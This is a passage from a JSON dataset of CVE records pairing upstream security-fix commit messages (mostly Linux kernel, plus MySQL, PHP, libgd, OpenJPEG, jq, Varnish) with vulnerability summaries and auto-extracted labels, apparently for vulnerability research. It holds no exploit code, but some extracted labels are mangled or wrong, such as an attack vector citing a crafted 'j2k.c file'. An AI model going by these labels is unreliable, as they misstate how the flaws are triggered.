attacker"},{"commit_id":"5c17c861a357e9458001f021a7afa7aab9937439","cve_id":"CVE-2016-0723","cwe_id":"CWE-362","commit_message":"tty: Fix unsafe ldisc reference via ioctl(TIOCGETD)\n\nioctl(TIOCGETD) retrieves the line discipline id directly from the\nldisc because the line discipline id (c_line) in termios is untrustworthy;\nuserspace may have set termios via ioctl(TCSETS*) without actually\nchanging the line discipline via ioctl(TIOCSETD).\n\nHowever, directly accessing the current ldisc via tty->ldisc is\nunsafe; the ldisc ptr dereferenced may be stale if the line discipline\nis changing via ioctl(TIOCSETD) or hangup.\n\nWait for the line discipline reference (just like read() or write())\nto retrieve the \"current\" line discipline id.\n\nCc: <stable@vger.kernel.org>\nSigned-off-by: Peter Hurley <peter@hurleysoftware.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Race condition in the tty_ioctl function in drivers\/tty\/tty_io.c in the Linux kernel through 4.4.1 allows local users to obtain sensitive information from kernel memory or cause a denial of service (use-after-free and system crash) by making a TIOCGETD ioctl call during processing of a TIOCSETD ioctl call.","commit_message_1":"fix unsafe ldisc reference via ioctl ( tiocgetd ) ioctl ( tiocgetd ) retrieves the line discipline id directly from the ldisc because the line discipline id ( c_line ) in termios is untrustworthy ; userspace may have set termios via ioctl ( tcsets * ) without actually changing the line discipline via ioctl ( tiocsetd )","Vulnerability Type":"Race Condition","Attack Vector":"by making a tiocgetd ioctl call during processing of a tiocsetd ioctl call","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( use - after - free and system crash )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"0dbd5a8797ed4bd18e8b883988fb62177eb0f73f","cve_id":"CVE-2016-0546","cwe_id":null,"commit_message":"Bug#21973610: BUFFER OVERFLOW ISSUES\n\nDescription : Incorrect usage of sprintf\/strcpy caused\n              possible buffer overflow issues at various\n              places.\n\nSolution : - Fixed mysql_plugin and mysqlshow\n           - Fixed regex library issues\n\nReviewed-By : Georgi Kodinov <georgi.kodinov@oracle.com>\nReviewed-By : Venkata S Murthy Sidagam <venkata.sidagam@oracle.com>","summary":"Unspecified vulnerability in Oracle MySQL 5.5.46 and earlier, 5.6.27 and earlier, and 5.7.9 and MariaDB before 5.5.47, 10.0.x before 10.0.23, and 10.1.x before 10.1.10 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Client.  NOTE: the previous information is from the January 2016 CPU. Oracle has not commented on third-party claims that these are multiple buffer overflows in the mysqlshow tool that allow remote database servers to have unspecified impact via a long table or database name.","commit_message_1":"buffer overflow issue description : incorrect usage of sprintf\/strcpy caused possible buffer overflow issue at various place","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors related to Client","Impact":"affect confidentiality, integrity, and availability","Root Cause":"related to the Client component","Attack Type":"local attacker"},{"commit_id":"dd504589577d8e8e70f51f997ad487a4cb6c026f","cve_id":"CVE-2015-8970","cwe_id":"CWE-476","commit_message":"crypto: algif_skcipher - Require setkey before accept(2)\n\nSome cipher implementations will crash if you try to use them\nwithout calling setkey first.  This patch adds a check so that\nthe accept(2) call will fail with -ENOKEY if setkey hasn't been\ndone on the socket yet.\n\nCc: stable@vger.kernel.org\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\nTested-by: Dmitry Vyukov <dvyukov@google.com>","summary":"crypto\/algif_skcipher.c in the Linux kernel before 4.4.2 does not verify that a setkey operation has been performed on an AF_ALG socket before an accept system call is processed, which allows local users to cause a denial of service (NULL pointer dereference and system crash) via a crafted application that does not supply a key, related to the lrw_crypt function in crypto\/lrw.c.","commit_message_1":"algif_skcipher - require setkey before accept ( <number> ) some cipher implementation will crash if you try to use them without calling setkey first","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted application that does not supply a key , related to the lrw _ crypt function in crypto \/ lrw . c","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"does not verify that a setkey operation has been performed on an af _ alg socket before an accept system call is processed","Attack Type":"local attacker"},{"commit_id":"76cc404bfdc0d419c720de4daaf2584542734f42","cve_id":"CVE-2015-8966","cwe_id":"CWE-264","commit_message":"[PATCH] arm: fix handling of F_OFD_... in oabi_fcntl64()\n\nCc: stable@vger.kernel.org # 3.15+\nReviewed-by: Jeff Layton <jeff.layton@primarydata.com>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"arch\/arm\/kernel\/sys_oabi-compat.c in the Linux kernel before 4.4 allows local users to gain privileges via a crafted (1) F_OFD_GETLK, (2) F_OFD_SETLK, or (3) F_OFD_SETLKW command in an fcntl64 system call.","commit_message_1":"arm : fix handling of f_ofd_","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted f _ ofd _ getlk , f _ ofd _ setlk , or  f _ ofd _ setlkw command in an fcntl64 system call","Impact":"gain privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"dd42bf1197144ede075a9d4793123f7689e164bc","cve_id":"CVE-2015-8964","cwe_id":"CWE-200","commit_message":"tty: Prevent ldisc drivers from re-using stale tty fields\n\nLine discipline drivers may mistakenly misuse ldisc-related fields\nwhen initializing. For example, a failure to initialize tty->receive_room\nin the N_GIGASET_M101 line discipline was recently found and fixed [1].\nNow, the N_X25 line discipline has been discovered accessing the previous\nline discipline's already-freed private data [2].\n\nHarden the ldisc interface against misuse by initializing revelant\ntty fields before instancing the new line discipline.\n\n[1]\n    commit fd98e9419d8d622a4de91f76b306af6aa627aa9c\n    Author: Tilman Schmidt <tilman@imap.cc>\n    Date:   Tue Jul 14 00:37:13 2015 +0200\n\n    isdn\/gigaset: reset tty->receive_room when attaching ser_gigaset\n\n[2] Report from Sasha Levin <sasha.levin@oracle.com>\n    [  634.336761] ==================================================================\n    [  634.338226] BUG: KASAN: use-after-free in x25_asy_open_tty+0x13d\/0x490 at addr ffff8800a743efd0\n    [  634.339558] Read of size 4 by task syzkaller_execu\/8981\n    [  634.340359] =============================================================================\n    [  634.341598] BUG kmalloc-512 (Not tainted): kasan: bad access detected\n    ...\n    [  634.405018] Call Trace:\n    [  634.405277] dump_stack (lib\/dump_stack.c:52)\n    [  634.405775] print_trailer (mm\/slub.c:655)\n    [  634.406361] object_err (mm\/slub.c:662)\n    [  634.406824] kasan_report_error (mm\/kasan\/report.c:138 mm\/kasan\/report.c:236)\n    [  634.409581] __asan_report_load4_noabort (mm\/kasan\/report.c:279)\n    [  634.411355] x25_asy_open_tty (drivers\/net\/wan\/x25_asy.c:559 (discriminator 1))\n    [  634.413997] tty_ldisc_open.isra.2 (drivers\/tty\/tty_ldisc.c:447)\n    [  634.414549] tty_set_ldisc (drivers\/tty\/tty_ldisc.c:567)\n    [  634.415057] tty_ioctl (drivers\/tty\/tty_io.c:2646 drivers\/tty\/tty_io.c:2879)\n    [  634.423524] do_vfs_ioctl (fs\/ioctl.c:43 fs\/ioctl.c:607)\n    [  634.427491] SyS_ioctl (fs\/ioctl.c:622 fs\/ioctl.c:613)\n    [  634.427945] entry_SYSCALL_64_fastpath (arch\/x86\/entry\/entry_64.S:188)\n\nCc: Tilman Schmidt <tilman@imap.cc>\nCc: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: Peter Hurley <peter@hurleysoftware.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The tty_set_termios_ldisc function in drivers\/tty\/tty_ldisc.c in the Linux kernel before 4.5 allows local users to obtain sensitive information from kernel memory by reading a tty data structure.","commit_message_1":"prevent ldisc driver from re-using stale tty field line discipline driver may mistakenly misuse ldisc-related field when initializing","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading a tty data structure","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"12ca6ad2e3a896256f086497a7c7406a547ee373","cve_id":"CVE-2015-8963","cwe_id":"CWE-416","commit_message":"perf: Fix race in swevent hash\n\nThere's a race on CPU unplug where we free the swevent hash array\nwhile it can still have events on. This will result in a\nuse-after-free which is BAD.\n\nSimply do not free the hash array on unplug. This leaves the thing\naround and no use-after-free takes place.\n\nWhen the last swevent dies, we do a for_each_possible_cpu() iteration\nanyway to clean these up, at which time we'll free it, so no leakage\nwill occur.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com>\nTested-by: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: Arnaldo Carvalho de Melo <acme@redhat.com>\nCc: Frederic Weisbecker <fweisbec@gmail.com>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Stephane Eranian <eranian@google.com>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: Vince Weaver <vincent.weaver@maine.edu>\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"Race condition in kernel\/events\/core.c in the Linux kernel before 4.4 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging incorrect handling of an swevent data structure during a CPU unplug operation.","commit_message_1":"fix race in swevent hash there 's a race on cpu unplug where we free the swevent hash array while it can still have event on","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging incorrect handling of an swevent data structure during a cpu unplug operation","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by use-after-free vulnerability","Attack Type":"local attacker"},{"commit_id":"f3951a3709ff50990bf3e188c27d346792103432","cve_id":"CVE-2015-8962","cwe_id":"CWE-415","commit_message":"sg: Fix double-free when drives detach during SG_IO\n\nIn sg_common_write(), we free the block request and return -ENODEV if\nthe device is detached in the middle of the SG_IO ioctl().\n\nUnfortunately, sg_finish_rem_req() also tries to free srp->rq, so we\nend up freeing rq->cmd in the already free rq object, and then free\nthe object itself out from under the current user.\n\nThis ends up corrupting random memory via the list_head on the rq\nobject. The most common crash trace I saw is this:\n\n  ------------[ cut here ]------------\n  kernel BUG at block\/blk-core.c:1420!\n  Call Trace:\n  [<ffffffff81281eab>] blk_put_request+0x5b\/0x80\n  [<ffffffffa0069e5b>] sg_finish_rem_req+0x6b\/0x120 [sg]\n  [<ffffffffa006bcb9>] sg_common_write.isra.14+0x459\/0x5a0 [sg]\n  [<ffffffff8125b328>] ? selinux_file_alloc_security+0x48\/0x70\n  [<ffffffffa006bf95>] sg_new_write.isra.17+0x195\/0x2d0 [sg]\n  [<ffffffffa006cef4>] sg_ioctl+0x644\/0xdb0 [sg]\n  [<ffffffff81170f80>] do_vfs_ioctl+0x90\/0x520\n  [<ffffffff81258967>] ? file_has_perm+0x97\/0xb0\n  [<ffffffff811714a1>] SyS_ioctl+0x91\/0xb0\n  [<ffffffff81602afb>] tracesys+0xdd\/0xe2\n    RIP [<ffffffff81281e04>] __blk_put_request+0x154\/0x1a0\n\nThe solution is straightforward: just set srp->rq to NULL in the\nfailure branch so that sg_finish_rem_req() doesn't attempt to re-free\nit.\n\nAdditionally, since sg_rq_end_io() will never be called on the object\nwhen this happens, we need to free memory backing ->cmd if it isn't\nembedded in the object itself.\n\nKASAN was extremely helpful in finding the root cause of this bug.\n\nSigned-off-by: Calvin Owens <calvinowens@fb.com>\nAcked-by: Douglas Gilbert <dgilbert@interlog.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"Double free vulnerability in the sg_common_write function in drivers\/scsi\/sg.c in the Linux kernel before 4.4 allows local users to gain privileges or cause a denial of service (memory corruption and system crash) by detaching a device during an SG_IO ioctl call.","commit_message_1":"fix double-free when drive detach during sg_io in sg_common_write ( ) , we free the block request and return -enodev if the device is detached in the middle of the sg_io ioctl ( )","Vulnerability Type":"double free","Attack Vector":"by detaching a device during an sg _ io ioctl call","Impact":"gain privileges or cause a denial of service ( memory corruption and system crash )","Root Cause":"caused by a double free vulnerability","Attack Type":"local attacker"},{"commit_id":"6934da9238da947628be83635e365df41064b09b","cve_id":"CVE-2015-8961","cwe_id":"CWE-416","commit_message":"ext4: fix potential use after free in __ext4_journal_stop\n\nThere is a use-after-free possibility in __ext4_journal_stop() in the\ncase that we free the handle in the first jbd2_journal_stop() because\nwe're referencing handle->h_err afterwards. This was introduced in\n9705acd63b125dee8b15c705216d7186daea4625 and it is wrong. Fix it by\nstoring the handle->h_err value beforehand and avoid referencing\npotentially freed handle.\n\nFixes: 9705acd63b125dee8b15c705216d7186daea4625\nSigned-off-by: Lukas Czerner <lczerner@redhat.com>\nReviewed-by: Andreas Dilger <adilger@dilger.ca>\nCc: stable@vger.kernel.org","summary":"The __ext4_journal_stop function in fs\/ext4\/ext4_jbd2.c in the Linux kernel before 4.3.3 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging improper access to a certain error field.","commit_message_1":"fix potential use after free in __ext4_journal_stop there is a use-after-free possibility in __ext4_journal_stop ( ) in the case that we free the handle in the first jbd2_journal_stop ( ) because we 're referencing handle- > h_err afterwards","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging improper access to a certain error field","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"951b6a0717db97ce420547222647bcc40bf1eacd","cve_id":"CVE-2015-8956","cwe_id":"CWE-476","commit_message":"Bluetooth: Fix potential NULL dereference in RFCOMM bind callback\n\naddr can be NULL and it should not be dereferenced before NULL checking.\n\nSigned-off-by: Jaganath Kanakkassery <jaganath.k@samsung.com>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>","summary":"The rfcomm_sock_bind function in net\/bluetooth\/rfcomm\/sock.c in the Linux kernel before 4.2 allows local users to obtain sensitive information or cause a denial of service (NULL pointer dereference) via vectors involving a bind system call on a Bluetooth RFCOMM socket.","commit_message_1":"fix potential null dereference in rfcomm bind callback addr can be null and it should not be dereferenced before null checking","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via vectors involving a bind system call on a bluetooth rfcomm socket","Impact":"obtain sensitive information or cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"8fff105e13041e49b82f92eef034f363a6b1c071","cve_id":"CVE-2015-8955","cwe_id":"CWE-264","commit_message":"arm64: perf: reject groups spanning multiple HW PMUs\n\nThe perf core implicitly rejects events spanning multiple HW PMUs, as in\nthese cases the event->ctx will differ. However this validation is\nperformed after pmu::event_init() is called in perf_init_event(), and\nthus pmu::event_init() may be called with a group leader from a\ndifferent HW PMU.\n\nThe ARM64 PMU driver does not take this fact into account, and when\nvalidating groups assumes that it can call to_arm_pmu(event->pmu) for\nany HW event. When the event in question is from another HW PMU this is\nwrong, and results in dereferencing garbage.\n\nThis patch updates the ARM64 PMU driver to first test for and reject\nevents from other PMUs, moving the to_arm_pmu and related logic after\nthis test. Fixes a crash triggered by perf_fuzzer on Linux-4.0-rc2, with\na CCI PMU present:\n\nBad mode in Synchronous Abort handler detected, code 0x86000006 -- IABT (current EL)\nCPU: 0 PID: 1371 Comm: perf_fuzzer Not tainted 3.19.0+ #249\nHardware name: V2F-1XV7 Cortex-A53x2 SMM (DT)\ntask: ffffffc07c73a280 ti: ffffffc07b0a0000 task.ti: ffffffc07b0a0000\nPC is at 0x0\nLR is at validate_event+0x90\/0xa8\npc : [<0000000000000000>] lr : [<ffffffc000090228>] pstate: 00000145\nsp : ffffffc07b0a3ba0\n\n[<          (null)>]           (null)\n[<ffffffc0000907d8>] armpmu_event_init+0x174\/0x3cc\n[<ffffffc00015d870>] perf_try_init_event+0x34\/0x70\n[<ffffffc000164094>] perf_init_event+0xe0\/0x10c\n[<ffffffc000164348>] perf_event_alloc+0x288\/0x358\n[<ffffffc000164c5c>] SyS_perf_event_open+0x464\/0x98c\nCode: bad PC value\n\nAlso cleans up the code to use the arm_pmu only when we know\nthat we are dealing with an arm pmu event.\n\nCc: Will Deacon <will.deacon@arm.com>\nAcked-by: Mark Rutland <mark.rutland@arm.com>\nAcked-by: Peter Ziljstra (Intel) <peterz@infradead.org>\nSigned-off-by: Suzuki K. Poulose <suzuki.poulose@arm.com>\nSigned-off-by: Will Deacon <will.deacon@arm.com>","summary":"arch\/arm64\/kernel\/perf_event.c in the Linux kernel before 4.1 on arm64 platforms allows local users to gain privileges or cause a denial of service (invalid pointer dereference) via vectors involving events that are mishandled during a span of multiple HW PMUs.","commit_message_1":"perf : reject group spanning multiple hw pmus the perf core implicitly reject event spanning multiple hw pmus , a in these case the event- > ctx will differ","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via vectors involving events that are mishandled during a span of multiple hw pmus .","Impact":"gain privileges or cause a denial of service ( invalid pointer dereference )","Root Cause":"caused by an invalid pointer dereference","Attack Type":"local attacker"},{"commit_id":"ab79efab0a0ba01a74df782eb7fa44b044dae8b5","cve_id":"CVE-2015-8953","cwe_id":"CWE-399","commit_message":"ovl: fix dentry reference leak\n\nIn ovl_copy_up_locked(), newdentry is leaked if the function exits through\nout_cleanup as this just to out after calling ovl_cleanup() - which doesn't\nactually release the ref on newdentry.\n\nThe out_cleanup segment should instead exit through out2 as certainly\nnewdentry leaks - and possibly upper does also, though this isn't caught\ngiven the catch of newdentry.\n\nWithout this fix, something like the following is seen:\n\n\tBUG: Dentry ffff880023e9eb20{i=f861,n=#ffff880023e82d90} still in use (1) [unmount of tmpfs tmpfs]\n\tBUG: Dentry ffff880023ece640{i=0,n=bigfile}  still in use (1) [unmount of tmpfs tmpfs]\n\nwhen unmounting the upper layer after an error occurred in copyup.\n\nAn error can be induced by creating a big file in a lower layer with\nsomething like:\n\n\tdd if=\/dev\/zero of=\/lower\/a\/bigfile bs=65536 count=1 seek=$((0xf000))\n\nto create a large file (4.1G).  Overlay an upper layer that is too small\n(on tmpfs might do) and then induce a copy up by opening it writably.\n\nReported-by: Ulrich Obergfell <uobergfe@redhat.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org> # v3.18+","summary":"fs\/overlayfs\/copy_up.c in the Linux kernel before 4.2.6 uses an incorrect cleanup code path, which allows local users to cause a denial of service (dentry reference leak) via filesystem operations on a large file in a lower overlayfs layer.","commit_message_1":"fix dentry reference leak in ovl_copy_up_locked ( ) , newdentry is leaked if the function exit through out_cleanup a this just to out after calling ovl_cleanup ( ) - which doe n't actually release the ref on newdentry","Vulnerability Type":"Resource Management Errors","Attack Vector":"via filesystem operations on a large file in a lower overlayfs layer","Impact":"cause a denial of service ( dentry reference leak )","Root Cause":"uses an incorrect cleanup code path","Attack Type":"local attacker"},{"commit_id":"6829e274a623187c24f7cfc0e3d35f25d087fcc5","cve_id":"CVE-2015-8950","cwe_id":"CWE-200","commit_message":"arm64: dma-mapping: always clear allocated buffers\n\nBuffers allocated by dma_alloc_coherent() are always zeroed on Alpha,\nARM (32bit), MIPS, PowerPC, x86\/x86_64 and probably other architectures.\nIt turned out that some drivers rely on this 'feature'. Allocated buffer\nmight be also exposed to userspace with dma_mmap() call, so clearing it\nis desired from security point of view to avoid exposing random memory\nto userspace. This patch unifies dma_alloc_coherent() behavior on ARM64\narchitecture with other implementations by unconditionally zeroing\nallocated buffer.\n\nCc: <stable@vger.kernel.org> # v3.14+\nSigned-off-by: Marek Szyprowski <m.szyprowski@samsung.com>\nSigned-off-by: Will Deacon <will.deacon@arm.com>","summary":"arch\/arm64\/mm\/dma-mapping.c in the Linux kernel before 4.0.3, as used in the ION subsystem in Android and other products, does not initialize certain data structures, which allows local users to obtain sensitive information from kernel memory by triggering a dma_mmap call.","commit_message_1":"dma-mapping : always clear allocated buffer buffer allocated by dma_alloc_coherent ( ) are always zeroed on alpha , arm ( 32bit ) , mips , powerpc , x86\/x86_64 and probably other architecture","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by triggering a dma _ mmap call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize certain data structures","Attack Type":"local attacker"},{"commit_id":"996faf964bba1aec06b153b370a7f20d3dd2bb8b?w=1","cve_id":"CVE-2015-8935","cwe_id":"CWE-79","commit_message":"Update header handling to RFC 7230","summary":"The sapi_header_op function in main\/SAPI.c in PHP before 5.4.38, 5.5.x before 5.5.22, and 5.6.x before 5.6.6 supports deprecated line folding without considering browser compatibility, which allows remote attackers to conduct cross-site scripting (XSS) attacks against Internet Explorer by leveraging (1) %0A%20 or (2) %0D%0A%20 mishandling in the header function.","commit_message_1":"update header handling to rfc <number>","Vulnerability Type":"Cross-site Scripting","Attack Vector":"by leveraging or mishandling in the header function","Impact":"conduct cross-site scripting (XSS) attacks against Internet Explorer","Root Cause":"caused by improper validation of user-supplied input","Attack Type":"remote attacker"},{"commit_id":"4751b606fa38edc456d627140898a7ec679fcc24","cve_id":"CVE-2015-8877","cwe_id":"CWE-399","commit_message":"gdImageScaleTwoPass memory leak fix\n\nFixing memory leak in gdImageScaleTwoPass, as reported by @cmb69 and\nconfirmed by @vapier.  This bug actually bit me in production and I'm\nvery thankful that it was reported with an easy fix.\n\nFixes #173.","summary":"The gdImageScaleTwoPass function in gd_interpolation.c in the GD Graphics Library (aka libgd) before 2.2.0, as used in PHP before 5.6.12, uses inconsistent allocate and free approaches, which allows remote attackers to cause a denial of service (memory consumption) via a crafted call, as demonstrated by a call to the PHP imagescale function.","commit_message_1":"gdimagescaletwopass memory leak fix fixing memory leak in gdimagescaletwopass , a reported by @ cmb69 and confirmed by @ vapier","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted call , as demonstrated by a call to the php imagescale function .","Impact":"cause a denial of service ( memory consumption","Root Cause":"uses inconsistent allocate and free approaches","Attack Type":"remote attacker"},{"commit_id":"940100c28ae28931722290794889cf84a92c5f6f","cve_id":"CVE-2015-8871","cwe_id":"CWE-416","commit_message":"Fix potential use-after-free in opj_j2k_write_mco function\n\nFixes #563","summary":"Use-after-free vulnerability in the opj_j2k_write_mco function in j2k.c in OpenJPEG before 2.1.1 allows remote attackers to have unspecified impact via unknown vectors.","commit_message_1":"fix potential use-after-free in opj_j2k_write_mco function","Vulnerability Type":"Use After Free","Attack Vector":"By persuading a victim to open a specially crafted j2k.c file","Impact":"have unspecified impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"6713ca45e7757297381f4b4cdb9cf5e624a9ad36","cve_id":"CVE-2015-8865","cwe_id":"CWE-119","commit_message":"PR\/454: Fix memory corruption when the continuation level jumps by more than\n20 in a single step.","summary":"The file_check_mem function in funcs.c in file before 5.23, as used in the Fileinfo component in PHP before 5.5.34, 5.6.x before 5.6.20, and 7.x before 7.0.5, mishandles continuation-level jumps, which allows context-dependent attackers to cause a denial of service (buffer overflow and application crash) or possibly execute arbitrary code via a crafted magic file.","commit_message_1":"fix memory corruption when the continuation level jump by more than <number> in a single step","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted magic file","Impact":"cause a denial of service ( buffer overflow and application crash ) or possibly execute arbitrary code","Root Cause":"mishandles continuation - level jumps","Attack Type":"remote attacker"},{"commit_id":"8eb1367ca44e772963e704a700ef72ae2e12babd","cve_id":"CVE-2015-8863","cwe_id":"CWE-119","commit_message":"Heap buffer overflow in tokenadd() (fix #105)\n\nThis was an off-by one: the NUL terminator byte was not allocated on\nresize.  This was triggered by JSON-encoded numbers longer than 256\nbytes.","summary":"Off-by-one error in the tokenadd function in jv_parse.c in jq allows remote attackers to cause a denial of service (crash) via a long JSON-encoded number, which triggers a heap-based buffer overflow.","commit_message_1":"heap buffer overflow in tokenadd ( ) ( fix # <number> ) this wa an off-by one : the nul terminator byte wa not allocated on resize","Vulnerability Type":"buffer overflow","Attack Vector":"via a long json - encoded number , which triggers a heap - based buffer overflow","Impact":"cause a denial of service ( crash )","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"29870c8fe95e4e8a672f6f28c5fbe692bea09e9c","cve_id":"CVE-2015-8852","cwe_id":null,"commit_message":"Check for duplicate Content-Length headers in requests\n\nIf a duplicate CL header is in the request, we fail the request with a\n400 (Bad Request)\n\nFix a test case that was sending duplicate CL by misstake and would\nnot fail because of that.","summary":"Varnish 3.x before 3.0.7, when used in certain stacked installations, allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via a header line terminated by a r (carriage return) character in conjunction with multiple Content-Length headers in an HTTP request.","commit_message_1":"check for duplicate content-length header in request if a duplicate cl header is in the request , we fail the request with a <number> ( bad request ) fix a test case that wa sending duplicate cl by misstake and would not fail because of that","Vulnerability Type":"carriage return","Attack Vector":"via a header line terminated by a r ( carriage return ) character in conjunction with multiple content - length headers in an http request","Impact":"inject arbitrary http headers and conduct http response splitting attacks","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"7f821fc9c77a9b01fe7b1d6e72717b33d8d64142","cve_id":"CVE-2015-8845","cwe_id":"CWE-284","commit_message":"powerpc\/tm: Check for already reclaimed tasks\n\nCurrently we can hit a scenario where we'll tm_reclaim() twice.  This\nresults in a TM bad thing exception because the second reclaim occurs\nwhen not in suspend mode.\n\nThe scenario in which this can happen is the following.  We attempt to\ndeliver a signal to userspace.  To do this we need obtain the stack\npointer to write the signal context.  To get this stack pointer we\nmust tm_reclaim() in case we need to use the checkpointed stack\npointer (see get_tm_stackpointer()).  Normally we'd then return\ndirectly to userspace to deliver the signal without going through\n__switch_to().\n\nUnfortunatley, if at this point we get an error (such as a bad\nuserspace stack pointer), we need to exit the process.  The exit will\nresult in a __switch_to().  __switch_to() will attempt to save the\nprocess state which results in another tm_reclaim().  This\ntm_reclaim() now causes a TM Bad Thing exception as this state has\nalready been saved and the processor is no longer in TM suspend mode.\nWhee!\n\nThis patch checks the state of the MSR to ensure we are TM suspended\nbefore we attempt the tm_reclaim().  If we've already saved the state\naway, we should no longer be in TM suspend mode.  This has the\nadditional advantage of checking for a potential TM Bad Thing\nexception.\n\nFound using syscall fuzzer.\n\nFixes: fb09692e71f1 (\"powerpc: Add reclaim and recheckpoint functions for context switching transactional memory processes\")\nCc: stable@vger.kernel.org # v3.9+\nSigned-off-by: Michael Neuling <mikey@neuling.org>\nSigned-off-by: Michael Ellerman <mpe@ellerman.id.au>","summary":"The tm_reclaim_thread function in arch\/powerpc\/kernel\/process.c in the Linux kernel before 4.4.1 on powerpc platforms does not ensure that TM suspend mode exists before proceeding with a tm_reclaim call, which allows local users to cause a denial of service (TM Bad Thing exception and panic) via a crafted application.","commit_message_1":"check for already reclaimed task currently we can hit a scenario where we 'll tm_reclaim ( ) twice","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted application .","Impact":"cause a denial of service","Root Cause":"does not ensure that tm suspend mode exists before proceeding with a tm _ reclaim call","Attack Type":"local attacker"},{"commit_id":"d2b9d2a5ad5ef04ff978c9923d19730cb05efd55","cve_id":"CVE-2015-8844","cwe_id":"CWE-20","commit_message":"powerpc\/tm: Block signal return setting invalid MSR state\n\nCurrently we allow both the MSR T and S bits to be set by userspace on\na signal return.  Unfortunately this is a reserved configuration and\nwill cause a TM Bad Thing exception if attempted (via rfid).\n\nThis patch checks for this case in both the 32 and 64 bit signals\ncode.  If both T and S are set, we mark the context as invalid.\n\nFound using a syscall fuzzer.\n\nFixes: 2b0a576d15e0 (\"powerpc: Add new transactional memory state to the signal context\")\nCc: stable@vger.kernel.org # v3.9+\nSigned-off-by: Michael Neuling <mikey@neuling.org>\nSigned-off-by: Michael Ellerman <mpe@ellerman.id.au>","summary":"The signal implementation in the Linux kernel before 4.3.5 on powerpc platforms does not check for an MSR with both the S and T bits set, which allows local users to cause a denial of service (TM Bad Thing exception and panic) via a crafted application.","commit_message_1":"block signal return setting invalid msr state currently we allow both the msr t and s bit to be set by userspace on a signal return","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( tm bad thing exception and panic )","Root Cause":"does not check for an msr with both the s and t bits set","Attack Type":"local attacker"},{"commit_id":"ea3d7209ca01da209cda6f0dea8be9cc4b7a933b","cve_id":"CVE-2015-8839","cwe_id":"CWE-362","commit_message":"ext4: fix races between page faults and hole punching\n\nCurrently, page faults and hole punching are completely unsynchronized.\nThis can result in page fault faulting in a page into a range that we\nare punching after truncate_pagecache_range() has been called and thus\nwe can end up with a page mapped to disk blocks that will be shortly\nfreed. Filesystem corruption will shortly follow. Note that the same\nrace is avoided for truncate by checking page fault offset against\ni_size but there isn't similar mechanism available for punching holes.\n\nFix the problem by creating new rw semaphore i_mmap_sem in inode and\ngrab it for writing over truncate, hole punching, and other functions\nremoving blocks from extent tree and for read over page faults. We\ncannot easily use i_data_sem for this since that ranks below transaction\nstart and we need something ranking above it so that it can be held over\nthe whole truncate \/ hole punching operation. Also remove various\nworkarounds we had in the code to reduce race window when page fault\ncould have created pages with stale mapping information.\n\nSigned-off-by: Jan Kara <jack@suse.com>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>","summary":"Multiple race conditions in the ext4 filesystem implementation in the Linux kernel before 4.5 allow local users to cause a denial of service (disk corruption) by writing to a page that is associated with a different user's file after unsynchronized hole punching and page-fault handling.","commit_message_1":"fix race between page fault and hole punching currently , page fault and hole punching are completely unsynchronized","Vulnerability Type":"Race Condition","Attack Vector":"by writing to a page that is associated with a different user ' s file after unsynchronized hole punching and page - fault handling","Impact":"cause a denial of service ( disk corruption )","Root Cause":"caused by multiple race conditions","Attack Type":"local attacker"},{"commit_id":"c4f4b82694fe48b02f7a881a1797131a6dad1364","cve_id":"CVE-2015-8830","cwe_id":null,"commit_message":"AIO: properly check iovec sizes\n\nIn Linus's tree, the iovec code has been reworked massively, but in\nolder kernels the AIO layer should be checking this before passing the\nrequest on to other layers.\n\nMany thanks 